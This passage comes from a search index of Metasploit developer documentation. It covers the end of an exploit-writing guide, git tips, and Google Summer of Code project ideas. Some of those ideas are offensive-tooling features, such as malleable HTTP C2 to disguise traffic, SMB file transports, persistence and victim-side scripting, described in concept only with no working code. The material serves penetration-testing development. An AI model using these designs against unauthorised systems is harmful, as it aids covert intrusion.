reference identifiers for a list. | Platform - The Platform field indicates what platforms are supported, for example: win, linux, osx, unix, bsd. | Targets - The Targets field is an array of systems, applications, setups, or specific versions your exploit is targeting. The second element or each target array is where you store specific metadata about that target, for example, a specific offset, a gadget, a ret address, etc. When a target is selected by the user, the metadata is loaded and tracked by a “target index”, and can be retrieved by using the target method. | Payloads - The Payloads field specifies how the payload should be encoded and generated. You can specify: Space, SaveRegisters, Prepend, PrependEncoder, BadChars, Append, AppendEncoder, MaxNops, MinNops, Encoder, Nop, EncoderType, EncoderOptions, ExtendedOptions, EncoderDontFallThrough. | . DisclosureDate - The DisclosureDate is about when the vulnerability was disclosed in public, in the format of: “M D Y”. For example: “Apr 04 2014” . Your exploit should also have a check method to support the check command, but this is optional in case it’s not possible. And finally, the exploit method is like your main method. Start writing your code there. An example exploit module is also available: example.rb . ",
    "url": "/docs/development/developing-modules/guides/get-started-writing-an-exploit.html#template",
    "relUrl": "/docs/development/developing-modules/guides/get-started-writing-an-exploit.html#template"
  },"88": {
    "doc": "Writing an exploit",
    "title": "Basic git commands",
    "content": "Metasploit no longer uses svn for source code management. Instead, we use git, so knowing some tricks with git go a long way. We’re not here to lecture you about how awesome git is; we know it has a learning curve, and it’s not surprising to find new users making mistakes. Every once a while, your git “rage” will kick in, and we understand. However, it’s important for you to take advantage of branching. Every time you make a module or make some changes to existing code, you should not do so on the default master branch. Why? Because when you do a msfupdate, which is Metasploit’s utility for updating your repository, it will do a git reset before merging the changes, and all your code goes away. Another mistake people tend to do is have all the changes on master before submitting a pull request. This is a bad idea because most likely; you’re submitting other crap you don’t intend to change, or you’re probably asking us to merge other unnecessary commit histories when there only needs to be one commit. Thanks for contributing your module to the community, but no thanks to your crazy commit history. So as a habit, when you want to make something new, or change something, begin with a new branch that’s up to date to master. First off, make sure you’re on master. If you do a git status it will tell you what branch you’re currently on: . $ git status # On branch upstream-master nothing to commit, working directory clean . Ok, now do a git pull to download the latest changes from Metasploit: . $ git pull Already up-to-date. At this point, you’re ready to start a new branch. In this case, we’ll name our new branch “my_awesome_branch”: . $ git checkout -b my_awesome_branch Switched to a new branch 'my_awesome_branch' . And then you can go ahead and add that module. Make sure it’s in the appropriate path: . $ git add [module path] . When you decide to save the changes, commit (if there’s only one module, you can do git commit -a too so you don’t have to type the module path. Note -a really means EVERYTHING): . $ git commit [module path] . When you’re done, push your changes, which will upload your code to your remote branch “my_awesome_branch”. You must push your changes in order to submit the pull request or share it with others on the Internet. $ git push origin my_awesome_branch . ",
    "url": "/docs/development/developing-modules/guides/get-started-writing-an-exploit.html#basic-git-commands",
    "relUrl": "/docs/development/developing-modules/guides/get-started-writing-an-exploit.html#basic-git-commands"
  },"89": {
    "doc": "Writing an exploit",
    "title": "References",
    "content": ". | https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit.rb | . ",
    "url": "/docs/development/developing-modules/guides/get-started-writing-an-exploit.html#references",
    "relUrl": "/docs/development/developing-modules/guides/get-started-writing-an-exploit.html#references"
  },"90": {
    "doc": "Writing an exploit",
    "title": "Writing an exploit",
    "content": " ",
    "url": "/docs/development/developing-modules/guides/get-started-writing-an-exploit.html",
    "relUrl": "/docs/development/developing-modules/guides/get-started-writing-an-exploit.html"
  },"91": {
    "doc": "Git cheatsheet",
    "title": "Git Cheatsheet (survival level)",
    "content": "Here is a set of some of the most common things you’ll need to do in your day-to-day workflow with Git. Pro Tip 1: you can get man pages for any git command by inserting a hyphen. As in: “man git-fetch” or “man git-merge” . Pro Tip 2: install the cheat gem for a really long cheat sheet available in your terminal. ",
    "url": "/docs/development/get-started/git/git-cheatsheet.html#git-cheatsheet-survival-level",
    "relUrl": "/docs/development/get-started/git/git-cheatsheet.html#git-cheatsheet-survival-level"
  },"92": {
    "doc": "Git cheatsheet",
    "title": "What’s going on?",
    "content": ". | What branch am I on? Which files are modified, which are staged, which are untracked, etc? . git status . | . ",
    "url": "/docs/development/get-started/git/git-cheatsheet.html#whats-going-on",
    "relUrl": "/docs/development/get-started/git/git-cheatsheet.html#whats-going-on"
  },"93": {
    "doc": "Git cheatsheet",
    "title": "Fetch, Pull, and Push",
    "content": ". | Get all new changes, and remote branch refs . git fetch . | Do a git fetch and (if possible) a merge on the current branch . git pull . | Push commits to the origin/master (like an SVN commit): . git push origin master . | Push commits on a non-master branch: . git push origin your_branch_name . | . ",
    "url": "/docs/development/get-started/git/git-cheatsheet.html#fetch-pull-and-push",
    "relUrl": "/docs/development/get-started/git/git-cheatsheet.html#fetch-pull-and-push"
  },"94": {
    "doc": "Git cheatsheet",
    "title": "Branching",
    "content": ". | See a list of local branches . git branch . | Switch to an existing branch . git checkout existing_branch_name . | Create a new branch and switch to it: . git checkout -b new_branch_name . | . ",
    "url": "/docs/development/get-started/git/git-cheatsheet.html#branching",
    "relUrl": "/docs/development/get-started/git/git-cheatsheet.html#branching"
  },"95": {
    "doc": "Git cheatsheet",
    "title": "Merging and Stashing",
    "content": ". | Merge my working branch into current branch: . git merge working_branch_name . | Temporarily clear my stage so I can switch to another branch (“stashing”): . git stash . | Get my stashed stuff back, leaving it in the list of stashes: . git stash apply . | Get my stashed stuff back, removing it from the list: . git stash pop . | . ",
    "url": "/docs/development/get-started/git/git-cheatsheet.html#merging-and-stashing",
    "relUrl": "/docs/development/get-started/git/git-cheatsheet.html#merging-and-stashing"
  },"96": {
    "doc": "Git cheatsheet",
    "title": "History, Conflicts, and Fixing Mistakes",
    "content": ". | See the log of commits: . git log . | See what changes were made in a given commit: . git show COMMIT_HASH . | See more detailed log information: . git whatchanged . | Get rid of all the changes I’ve made since last commit: . git reset --hard . | Get rid of the changes for just one file: . git checkout FILENAME . | Make HEAD point to the state of the codebase as of 2 commits ago: . git checkout HEAD^^ . | Fix a conflict (w/ system’s default graphical diff tool): . git mergetool . | Revert a commit (be careful with merges!): . git revert &lt;commit hash&gt; . | Revert a commit from a merge: . git revert -m&lt;number of commits back in the merge to revert&gt; &lt;hash of merge commit&gt; . | . (e.g. git revert -m1 4f76f3bbb83ffe4de74a849ad9f68707e3568e16 will revert the first commit back in the merge performed at 4f76f3bbb83ffe4de74a849ad9f68707e3568e16) . ",
    "url": "/docs/development/get-started/git/git-cheatsheet.html#history-conflicts-and-fixing-mistakes",
    "relUrl": "/docs/development/get-started/git/git-cheatsheet.html#history-conflicts-and-fixing-mistakes"
  },"97": {
    "doc": "Git cheatsheet",
    "title": "Git in Bash",
    "content": "When using Git, it’s very handy (read: pretty much mandatory) to have an ambient cue in your shell telling you what branch you’re currently on. Use this function in your .profile/.bashrc/.bash_profile to enable you to place your Git branch in your prompt: . function parse_git_branch { git branch --no-color 2&gt; /dev/null | sed -e '/^[^*]/d' -e 's/* \\(.*\\)/(\\1)/' } . ",
    "url": "/docs/development/get-started/git/git-cheatsheet.html#git-in-bash",
    "relUrl": "/docs/development/get-started/git/git-cheatsheet.html#git-in-bash"
  },"98": {
    "doc": "Git cheatsheet",
    "title": "Git cheatsheet",
    "content": " ",
    "url": "/docs/development/get-started/git/git-cheatsheet.html",
    "relUrl": "/docs/development/get-started/git/git-cheatsheet.html"
  },"99": {
    "doc": "Git Reference Sites",
    "title": "Learning Git",
    "content": "The following sites are great references for Git padawans and jedi alike: . | Git-SVN crash course: Lots of good stuff on helping newbies grok the concepts of Git w/ reference to similar concepts in Subversion. | Codecademy Git Course: Great free course for quickly getting up to speed on Git with helpful hands on exercises. | Learn Git Branching: Good website for learning how Git branching works in a visual and interactive manner. | Git Reference: From the site: “meant to be a quick reference for learning and remembering the most important and commonly used Git commands.” Follows a tutorial-like format. Great for beginners. | The Pro Git Book: A free, online copy of the Pro Git book by GitHubber Scott Chacon. | The Git Community Book: A free book put together by the Git community for those new to Git. | Git Magic: Another free Git book put together by a Stanford CS student. | Git Ready: A collection of Git tips and tricks. | The Git Parable: A story by GitHub founder Tom Preston-Werner that reveals the underlying principles behind Git’s construction. A great starting point for understanding the nature of Git. | Git is Easier Than You Think: A nice tutorial that breaks down one Git user’s experience switching from Subversion. | PeepCode: Git: A one-hour (not-free) screencast covering Git basics. Well-made and easy to follow. | GitHub Flow: Another great post from Scott Chacon describing a GitHub-based workflow for projects. | Getting Started with GitHub: Also from GitHub’s own Scott Chacon, this two-part screencast (one free and one paid) will walk you through the basics of using GitHub. | . ",
    "url": "/docs/development/get-started/git/git-reference-sites.html#learning-git",
    "relUrl": "/docs/development/get-started/git/git-reference-sites.html#learning-git"
  },"100": {
    "doc": "Git Reference Sites",
    "title": "Using Git in Editors",
    "content": ". | Fugitive plugin for Vim: Provides lots of tasty functionality from inside Vim. There’s also a five-part series on VimCasts on using Fugitive for almost any git task you can think of. | TextMate - a bundle for git ships with the editor. Highlight your top-level folder in the project drawer and then invoke with Command-Shift-G . | . ",
    "url": "/docs/development/get-started/git/git-reference-sites.html#using-git-in-editors",
    "relUrl": "/docs/development/get-started/git/git-reference-sites.html#using-git-in-editors"
  },"101": {
    "doc": "Git Reference Sites",
    "title": "SVN mirroring",
    "content": "Of course, if you’re still having trouble, GitHub does offer basic SVN read-write support. ",
    "url": "/docs/development/get-started/git/git-reference-sites.html#svn-mirroring",
    "relUrl": "/docs/development/get-started/git/git-reference-sites.html#svn-mirroring"
  },"102": {
    "doc": "Git Reference Sites",
    "title": "Git Reference Sites",
    "content": " ",
    "url": "/docs/development/get-started/git/git-reference-sites.html",
    "relUrl": "/docs/development/get-started/git/git-reference-sites.html"
  },"103": {
    "doc": "2017 Mentor Organization Application",
    "title": "2017 Mentor Organization Application",
    "content": "This is how the application was submitted on 2017-02-08. Please make no more edits . – . Please don’t use markdown here, we have to paste it into a form. All answers are limited to 1000 chars. – . Why does your org want to participate in Google Summer of Code? . The story of Metasploit Framework’s creation and development over the last 13 years is one of community collaboration to create and hone tools useful to a wide range of security practitioners. Its broad functionality, combined with the deep domain knowledge of the mentors, offers a unique opportunity for students to learn about security and exploit development. Many of our contributors are established exploit developers and penetration testers who have years of industry experience that they can share with students. We hope that the experience will inspire students to continue contributing to open source security, as well as providing them with invaluable real-world training in development, security, and remote collaboration. How will you keep mentors engaged with their students? . All of our mentors are long-time development team members who have a history of helping new users and contributors. Many of our mentors specialize in certain parts of the framework, so depending on the student’s interests, we will match them with the most complementary mentor. Our project administrators will regularly check in with mentors and students to ensure that the relationship is productive and progressing as expected. How will you help your students stay on schedule to complete their projects? . First, we will ask students to use GitHub’s Projects to track progress in real time as they are working. Mentors will help students divide projects into manageable chunks with measurable milestones. This will help students learn how to manage and break up tasks on large scale projects. Additionally, students and mentors will need to collaborate on a weekly status report that describes their progress and send it to the mailing list. How will you get your students involved in your community during GSoC? . Students will use the same channels that all our contributors use: IRC and GitHub. Students will follow the same procedures of code review that all our contributors follow. By providing them with the same communication channels that our community uses, we hope to encourage the students to interact and collaborate with other contributors and users and to explore additional resources beyond their mentor. Hopefully, this process will give them a network of support and illustrate the advantages of working with other minds. How will you keep students involved with your community after GSoC? . Based on the success of the project, we will encourage students to apply for committer rights at the conclusion of GSoC, include them in Metasploit roadmap discussions, and invite them to special community events. After the conclusion of GSoC we will encourage students to write about their experience on Metasploit’s community blog, which will give their work greater exposure to the overall security community. ",
    "url": "/docs/development/google-summer-of-code/gsoc-2017-mentor-organization-application.html",
    "relUrl": "/docs/development/google-summer-of-code/gsoc-2017-mentor-organization-application.html"
  },"104": {
    "doc": "2017 Project Ideas",
    "title": "Console side",
    "content": "Convert between CMD_UNIX and the interpreted language architectures . Perl, Python, and Ruby scripts can all be run via a short command line invocation. It would be nice to be able to use these payloads in ARCH_CMD contexts as well as their own separate architectures (ARCH_PYTHON, ARCH_RUBY). This would allow modules that exploit command injection vulnerabilities to use python meterpreter in particular. Difficulty: 4/5 Requirements: Ruby, Python, bash/sh Mentor: @wvu @sempervictus . Automated exploit reliability scoring . Automatically run a module over and over, determine success rates. Mentor: @busterb . Exploit regression testing . Set up automated testing using something like Vagrant to spin up and configure vulnerable machines, run exploits against them. A categorical focus . Something like “make all X exploits badass”, or add a full suite of modules around particular gear or vendor stack. Requirements: Ruby Mentor: @hdm . Allow post modules to take a payload . As it stands, the framework defines anything that takes a payload to be an exploit. Because post-exploitation modules cannot take a payload, things that want to drop an executable for persistence are implemented as local exploits (in the exploit/*/local namespace instead of post/*/persistence). This project would give those kinds of modules a more consistent interface. Once this is done, we can move the exploit/*/local modules that aren’t actually exploits back to post/ . Difficulty: 3/5 Requirements: Ruby Mentor: @egypt . SMB2 support . (see also ruby_smb project) . Difficulty: 5/5 Mentor: @egypt . Filesystem sessions . The idea here is to create a new session type for authenticated protocols that give you filesystem access. The simplest is FTP, so that’s where we should start. We’ll need several pieces for this to work: . | A new session interface in Msf::Sessions (lib/msf/base/sessions/). This should be abstract enough that we can implement protocols other than FTP in the future. | A mapping of protocol details to that interface. | A new command dispatcher implementing at least these commands: upload, download, ls, cd | We’ll need to modify auxiliary/scanner/ftp/ftp_login to create one of these awesome new sessions when authentication is successful. | . Difficulty: 2/5 Requirements: Ruby . SMB-based file transport for Meterpreter . The idea here is to create a transport that allows Meterpreter and Console to talk via File handles opened via UNC path. In cases where 445 is allowed outbound, Meterpreter can open file handles to a UNC path that MSF is listening on, and they can communicate on those file handles. For this to work we need: . | A new transport that knows how to operate over SMB file handles . | In particular, one file handle is used for writing, and one for reading. | . | New stagers that use the Win32 API to open file handles to a given UNC path. | Most of this is already done in a PR for named pipe transport support, and so a few changes to those stagers should result in it working fine for this. | . | To come up with a method/protocol that both Console and Meterpreter can use to identify when new sessions come in. | . Given that SMB file reading and writing is already a thing, this shouldn’t be too hard on the MSF side. Difficulty: 3/5 Requirements: Ruby &amp; SMB Mentor: @OJ and/or @egypt . – . ",
    "url": "/docs/development/google-summer-of-code/gsoc-2017-project-ideas.html#console-side",
    "relUrl": "/docs/development/google-summer-of-code/gsoc-2017-project-ideas.html#console-side"
  },"105": {
    "doc": "2017 Project Ideas",
    "title": "Payload side",
    "content": "Malleable HTTP/S C2 for Meterpreter . Currently, the attributes that one can set for how a Meterpreter payload appears at the HTTP level are limited. We would like the ability to set and add arbitrary HTTP headers to requests and responses, so that the traffic appears more realistic. Difficulty: 5/5 Requirements: C, Ruby. Bonus: Python, PHP Mentor: @busterb . Asynchronous victim-side scripting . Using either Python or Powershell (or maybe both if it can be abstract enough). This could allow things like running Responder.py or Empire on a compromised host. Difficulty: 4/5 Requirements: C, Python/Powershell Mentor: @OJ . Use SChannel in native Windows Meterpreter instead of embedded OpenSSL . SChannel is Windows’ built-in TLS library. Difficulty: 3/5 Requirements: C, Windows systems programming Mentor: @OJ . SMB-based file transport for Meterpreter . This is the Meterpreter side of the SMB transport mentioned in the Console section. For this to work we need: . | A new Meterpreter transport that uses file handles to read and write data over SMB to talk to MSF. | Use the named pipe transport PR to see how this might work. | . | Full support of the “protocol” that has been designed so that MSF knows when sessions come in. | . Difficulty: 2/5 Requirements: C, Windows systems programming Mentor: @OJ . – . ",
    "url": "/docs/development/google-summer-of-code/gsoc-2017-project-ideas.html#payload-side",
    "relUrl": "/docs/development/google-summer-of-code/gsoc-2017-project-ideas.html#payload-side"
  },"106": {
    "doc": "2017 Project Ideas",
    "title": "Metasploitable3",
    "content": "Metasploitable3 is an intentionally vulnerable virtual machine. It was created to be a learning tool for new users as well as a place to test Metasploit and its payloads. Linux: add vulnerabilities . Requirements: Vagrant . Windows: add vulnerabilities . Requirements: Vagrant . – . ",
    "url": "/docs/development/google-summer-of-code/gsoc-2017-project-ideas.html#metasploitable3",
    "relUrl": "/docs/development/google-summer-of-code/gsoc-2017-project-ideas.html#metasploitable3"
  },"107": {
    "doc": "2017 Project Ideas",
    "title": "Miscellaneous",
    "content": "Replace msftidy with a real linter . Our current module style checker is a mass of regular expressions attempting to look for bad patterns. It could be much improved by using a real lexer. We could use rubocop as a base for this. This could also dovetail into an ongoing documentation project. Difficulty: 2/5 Requirements: Ruby . ",
    "url": "/docs/development/google-summer-of-code/gsoc-2017-project-ideas.html#miscellaneous",
    "relUrl": "/docs/development/google-summer-of-code/gsoc-2017-project-ideas.html#miscellaneous"
  },"108": {
    "doc": "2017 Project Ideas",
    "title": "Potential Mentors",
    "content": "All of the following folks have expressed willingness to be mentors. | @busterb | @egypt | @hdm | @jhart-r7 | @jinq102030 | @mubix | @OJ | @sempervictus | @wvu | @zeroSteiner | . ",
    "url": "/docs/development/google-summer-of-code/gsoc-2017-project-ideas.html#potential-mentors",
    "relUrl": "/docs/development/google-summer-of-code/gsoc-2017-project-ideas.html#potential-mentors"
  },"109": {
    "doc": "2017 Project Ideas",
    "title": "2017 Project Ideas",
    "content": "GSoC Project Ideas in no particular order. When you’ve picked one, take a look at GSoC 2017 Student Proposal for how to make a proposal. Submit your own . If you want to suggest your own idea, please discuss it with us first on our mailing list to make sure it is a reasonable amount of work for a summer and that it fits the goals of the project. – . ",
    "url": "/docs/development/google-summer-of-code/gsoc-2017-project-ideas.html",
    "relUrl": "/docs/development/google-summer-of-code/gsoc-2017-project-ideas.html"
  },"110": {
    "doc": "2017 Student Proposal",
    "title": "Title",
    "content": "A brief description of what you would like to work on. See GSoC-2017-Project-Ideas for ideas. ",
    "url": "/docs/development/google-summer-of-code/gsoc-2017-student-proposal.html#title",
    "relUrl": "/docs/development/google-summer-of-code/gsoc-2017-student-proposal.html#title"
  },"111": {
    "doc": "2017 Student Proposal",
    "title": "Vitals",
    "content": ". | Your name | Contact info - include at least: . | an email address | github user name | Freenode nick | . | . ",
    "url": "/docs/development/google-summer-of-code/gsoc-2017-student-proposal.html#vitals",
    "relUrl": "/docs/development/google-summer-of-code/gsoc-2017-student-proposal.html#vitals"
  },"112": {
    "doc": "2017 Student Proposal",
    "title": "Skillz",
    "content": "What programming languages are you familiar with, in order of proficiency? Most of Metasploit is written in Ruby; for any project you will most likely need at least a passing knowledge of it. If you want to work on Meterpreter or Mettle, C will be necessary as well. What other projects have you worked on before? . ",
    "url": "/docs/development/google-summer-of-code/gsoc-2017-student-proposal.html#skillz",
    "relUrl": "/docs/development/google-summer-of-code/gsoc-2017-student-proposal.html#skillz"
  },"113": {
    "doc": "2017 Student Proposal",
    "title": "Your project",
    "content": "Fill in the details. What exactly do you want to accomplish? . ",
    "url": "/docs/development/google-summer-of-code/gsoc-2017-student-proposal.html#your-project",
    "relUrl": "/docs/development/google-summer-of-code/gsoc-2017-student-proposal.html#your-project"
  },"114": {
    "doc": "2017 Student Proposal",
    "title": "2017 Student Proposal",
    "content": "Send the following to msfdev@metasploit.com . ",
    "url": "/docs/development/google-summer-of-code/gsoc-2017-student-proposal.html",
    "relUrl": "/docs/development/google-summer-of-code/gsoc-2017-student-proposal.html"
  },"115": {
    "doc": "2018 Project Ideas",
    "title": "Enhance Metasploit Framework",
    "content": "Improving the Post-exploit / Meterpreter functionality . Examples could include: . | Sending keystrokes and mouse movement to a Meterpreter session | HTML based VNC style session control e.g https://github.com/rapid7/metasploit-framework/pull/9196 but accepting user input from the browser | Playing (streaming?) sounds to a Meterpreter session | Implementing the streaming record mechanism from more Meterpreter sessions | Text-to-speech and volume control | Fun behaviors . | Ejecting the CD-ROM drive | Flipping the screen upside down | Changing screen colors | Turning the monitor on/off | Ordering donuts | . | MessageBox or live chat functionality (e.g “This machine is vulnerable to MS17-010, you must run Windows Update!”) | Overlaying an image or even HTML on the user interface | . Difficulty: Varies . Improving post-exploit API to be more consistent, work smoothly across session types . The Metasploit post-exploitation API is intended to provide a unified interface between different Meterpreter, shell, powershell, mainframe, and other session types. However, there are areas where the implementation is not consistent, and could use improvements: . | Shell sessions do not implement the filesystem API that Meterpreter sessions have | When a shell session is in a different language, e.g. Windows in French, the post API does not find the expected output. Add localization support for these. | Simple commands like ‘cmd_exec’ are fast in Shell sessions but are relatively slow in Meterpreter sessions. Add an API to make Meterpreter run simple commands more easily. | . Difficulty: Varies . ",
    "url": "/docs/development/google-summer-of-code/gsoc-2018-project-ideas.html#enhance-metasploit-framework",
    "relUrl": "/docs/development/google-summer-of-code/gsoc-2018-project-ideas.html#enhance-metasploit-framework"
  },"116": {
    "doc": "2018 Project Ideas",
    "title": "Add meta-shell commands",
    "content": "Shell sessions typically expose a direct connection to a remote shell, but are lacking a number of nice features such as the ability to stop a remote command, background a command (this could be advanced or depend on the underlying session), or to even lock the session. This project would implement some pre-processing hooks to shell sessions so that job control could be added by default (allowing backgrounding of commands), meta-commands like ‘background’ and ‘sessions’ could be added as well. Difficulty: 3/5 . Improve the web vulnerability API . This would follow up on the Arachni plugin PR https://github.com/rapid7/metasploit-framework/pull/8618 and improve the Metasploit data model to better represent modern web vulnerabilities. This project would require knowledge of data models, types of modern web vulnerabilities, and experience with web app security scanners. Difficulty: 4/5 . Session-style module interaction . Metasploit has the concept of ‘sessions’ where a connection context can define its own set of console operations. E.g. if you interact with a session, Metasploit switches to a specific subconsole for interaction. It would be nice as an alternative to ‘action’ for auxiliary modules, or as a way to merge related modules, to simply interact with the module. Difficulty: 3/5 . Integration plugin with a 3rd-party post-exploit framework . Connect a 3rd-party post-exploitation framework with Metasploit, such as Empire, Pupy, or Koadic, so that Metasploit can view and interact with sessions outside of its own types. Being able to use outside stagers in exploits, or adding the ability to ‘upgrade’ a session to an outside session type are other possibilities. Difficulty 3/5 . ",
    "url": "/docs/development/google-summer-of-code/gsoc-2018-project-ideas.html#add-meta-shell-commands",
    "relUrl": "/docs/development/google-summer-of-code/gsoc-2018-project-ideas.html#add-meta-shell-commands"
  },"117": {
    "doc": "2018 Project Ideas",
    "title": "Enhance Metasploitable3",
    "content": "Create a Simulated Active Directory Domain . Expand functionality of the existing Windows 2008 VM to act as a domain controller. The setup should include a number of users of varying roles, multiple group policy objects and settings, and logon scripts or application deployments. Considerations should be taken on how and where to include purposeful vulnerabilities within these settings. Difficulty 2/5 . Configure a Mock Corporate Network . Currently metasploitable3 consists of two separate virtual machines with all currently configured vulnerable services available with a simple network connection. This should be expanded to include a larger number of VMs with services spread across them to better simulate a real world environment. Considerations must be taken for deploying this on systems with varying hardware availability, or look into different cloud providers. Difficulty 4/5 . Add Monitoring Capabilities Between VMs . Metasploitable3 is already a playground from an attacker’s point of view, but how can we make it valuable from a defender’s perspective. Research various network monitoring and detections solutions and implement them across the mock network. Set up a new “NOC” VM for keeping track of activity and watching for intrusion. This goal is to make it fairly simple for anyone to set up a red team vs blue team mock environment. Difficulty 5/5 . ",
    "url": "/docs/development/google-summer-of-code/gsoc-2018-project-ideas.html#enhance-metasploitable3",
    "relUrl": "/docs/development/google-summer-of-code/gsoc-2018-project-ideas.html#enhance-metasploitable3"
  },"118": {
    "doc": "2018 Project Ideas",
    "title": "Goliath",
    "content": "Data Visualization . Enhance existing Metasploit Goliath dashboard that allows observation of an active engagement. Data visualization would include, but not be limited to: host node graph with activity indicators and heat maps. Metasploit ‘Goliath’ Demo (msf-red) . Difficulty 3/5 . Elasticsearch Datastore . Write Goliath data to Elasticsearch. Explore data visualization using Kibana. Difficulty 3/5 . ",
    "url": "/docs/development/google-summer-of-code/gsoc-2018-project-ideas.html#goliath",
    "relUrl": "/docs/development/google-summer-of-code/gsoc-2018-project-ideas.html#goliath"
  },"119": {
    "doc": "2018 Project Ideas",
    "title": "Submit your own",
    "content": "If you want to suggest your own idea, please discuss it with us first on our mailing list to make sure it is a reasonable amount of work for a summer and that it fits the goals of the project. ",
    "url": "/docs/development/google-summer-of-code/gsoc-2018-project-ideas.html#submit-your-own",
    "relUrl": "/docs/development/google-summer-of-code/gsoc-2018-project-ideas.html#submit-your-own"
  },"120": {
    "doc": "2018 Project Ideas",
    "title": "2018 Project Ideas",
    "content": "GSoC Project Ideas in no particular order. Mentors: @busterb, @zerosteiner, @timwr, @asoto-r7, @jmartin-r7, @pbarry-r7, @mkienow-r7, @jbarnett-r7 . ",
    "url": "/docs/development/google-summer-of-code/gsoc-2018-project-ideas.html",
    "relUrl": "/docs/development/google-summer-of-code/gsoc-2018-project-ideas.html"
  },"121": {
    "doc": "2019 Project Ideas",
    "title": "2019 Project Ideas",
    "content": "TBD! . ",
    "url": "/docs/development/google-summer-of-code/gsoc-2019-project-ideas.html",
    "relUrl": "/docs/development/google-summer-of-code/gsoc-2019-project-ideas.html"
  },"122": {
    "doc": "2020 Project Ideas",
    "title": "Enhance Metasploit Framework",
    "content": "Improving post-exploit API to be more consistent, work smoothly across session types . The Metasploit post-exploitation API is intended to provide a unified interface between different Meterpreter, shell, powershell, mainframe, and other session types. However, there are areas where the implementation is not consistent, and could use improvements: . | Shell sessions do not implement the filesystem API that Meterpreter sessions have | When a shell session is in a different language, e.g. Windows in French, the post API does not find the expected output. Add localization support for these. | Simple commands like ‘cmd_exec’ are fast in Shell sessions but are relatively slow in Meterpreter sessions. Add an API to make Meterpreter run simple commands more easily. | . Difficulty: Varies . Improve the web vulnerability API . This would follow up on the Arachni plugin PR https://github.com/rapid7/metasploit-framework/pull/8618 and improve the Metasploit data model to better represent modern web vulnerabilities. This project would require knowledge of data models, types of modern web vulnerabilities, and experience with web app security scanners. Difficulty: 4/5 . Session-style module interaction . Metasploit has the concept of ‘sessions’ where a connection context can define its own set of console operations. E.g. if you interact with a session, Metasploit switches to a specific subconsole for interaction. It would be nice as an alternative to ‘action’ for auxiliary modules, or as a way to merge related modules, to simply interact with the module. Difficulty: 3/5 . Enhance Sql Injection Support . Enable faster implementation of SQL injection based explot modules by adding library support for common injection attack vectors. Currently very few sql injection exploits are implemented for Metasploit possibly due to the high complexity of building out injection queries and posting them to a vulnerable URI. Difficulty: 3/5 . Conditionally Exposed Options . The Metasploit Framework’s modules offer the core functionality of the project and these each use a set of datastore options for configuration. Many modules specify a particular system that they target or action that they provide. Modules should (but currently lack) the ability to expose and hide options through the UI based on either the target or action that they take. This would allow module developers to create more flexible modules without sacrificing user experience by exposing options that are irrelevant based on the current configuration. Difficulty: 2/5 . ",
    "url": "/docs/development/google-summer-of-code/gsoc-2020-project-ideas.html#enhance-metasploit-framework",
    "relUrl": "/docs/development/google-summer-of-code/gsoc-2020-project-ideas.html#enhance-metasploit-framework"
  },"123": {
    "doc": "2020 Project Ideas",
    "title": "Goliath",
    "content": "Data Visualization . Enhance existing Metasploit Goliath dashboard that allows observation of an active engagement. Data visualization would include, but not be limited to: host node graph with activity indicators and heat maps. Metasploit ‘Goliath’ Demo (msf-red) . Difficulty 3/5 . Elasticsearch Datastore . Write Goliath data to Elasticsearch. Explore data visualization using Kibana. Difficulty 3/5 . ",
    "url": "/docs/development/google-summer-of-code/gsoc-2020-project-ideas.html#goliath",
    "relUrl": "/docs/development/google-summer-of-code/gsoc-2020-project-ideas.html#goliath"
  },"124": {
    "doc": "2020 Project Ideas",
    "title": "Submit your own",
    "content": "If you want to suggest your own idea, please discuss it with us first on our mailing list to make sure it is a reasonable amount of work for a summer and that it fits the goals of the project. ",
    "url": "/docs/development/google-summer-of-code/gsoc-2020-project-ideas.html#submit-your-own",
    "relUrl": "/docs/development/google-summer-of-code/gsoc-2020-project-ideas.html#submit-your-own"
  },"125": {
    "doc": "2020 Project Ideas",
    "title": "2020 Project Ideas",
    "content": "GSoC Project Ideas in no particular order. When you’ve picked one, take a look at How-to-Apply-to-GSoC for how to make a proposal. Mentors: @zerosteiner, @jmartin-r7 . ",
    "url": "/docs/development/google-summer-of-code/gsoc-2020-project-ideas.html",
    "relUrl": "/docs/development/google-summer-of-code/gsoc-2020-project-ideas.html"
  },"126": {
    "doc": "2021 Project Ideas",
    "title": "Enhance Metasploit Framework",
    "content": "Retain active status of authentication tokens . Many testing techniques interacting with web servers such as XSS rely on ensuring authentication obtained on a target be kept active. A mechanism for regstering and maintaining open authentications identified during a test for the duration of the console session may provide an additional utility to enable more modules to target techniques that need valid authentication to be maintained. One such authentication token would be data retained in a cookie for a web service. This project would lay the groundwork for registering gathered or generated authenticaion tokens against a target to be refreshed and sustained until a console exits, or in some cases across console restarts. Difficulty: 2/5 . Improving post-exploit API to be more consistent, work smoothly across session types . The Metasploit post-exploitation API is intended to provide a unified interface between different Meterpreter, shell, powershell, mainframe, and other session types. However, there are areas where the implementation is not consistent, and could use improvements: . | Shell sessions do not implement the filesystem API that Meterpreter sessions have | When a shell session is in a different language, e.g. Windows in French, the post API does not find the expected output. Add localization support for these. | Simple commands like ‘cmd_exec’ are fast in Shell sessions but are relatively slow in Meterpreter sessions. Add an API to make Meterpreter run simple commands more easily. | . Difficulty: Varies . Improve the web vulnerability API . This would follow up on the Arachni plugin PR https://github.com/rapid7/metasploit-framework/pull/8618 and improve the Metasploit data model to better represent modern web vulnerabilities. This project would require knowledge of data models, types of modern web vulnerabilities, and experience with web app security scanners. Difficulty: 4/5 . Data Visualization . Enhance existing Metasploit Goliath dashboard that allows observation of an active engagement. Data visualization would include, but not be limited to: host node graph with activity indicators and heat maps. Metasploit ‘Goliath’ Demo (msf-red) . Difficulty 3/5 . Elasticsearch Datastore . Write Goliath data to Elasticsearch. Explore data visualization using Kibana. Difficulty 3/5 . ",
    "url": "/docs/development/google-summer-of-code/gsoc-2021-project-ideas.html#enhance-metasploit-framework",
    "relUrl": "/docs/development/google-summer-of-code/gsoc-2021-project-ideas.html#enhance-metasploit-framework"
  },"127": {
    "doc": "2021 Project Ideas",
    "title": "Submit your own",
    "content": "If you want to suggest your own idea, please discuss it with us first on our mailing list to make sure it is a reasonable amount of work for a summer and that it fits the goals of the project. ",
    "url": "/docs/development/google-summer-of-code/gsoc-2021-project-ideas.html#submit-your-own",
    "relUrl": "/docs/development/google-summer-of-code/gsoc-2021-project-ideas.html#submit-your-own"
  },"128": {
    "doc": "2021 Project Ideas",
    "title": "2021 Project Ideas",
    "content": "GSoC Project Ideas in no particular order. When you’ve picked one, take a look at How-to-Apply-to-GSoC for how to make a proposal. Mentors: @zerosteiner, @jmartin-r7 . ",
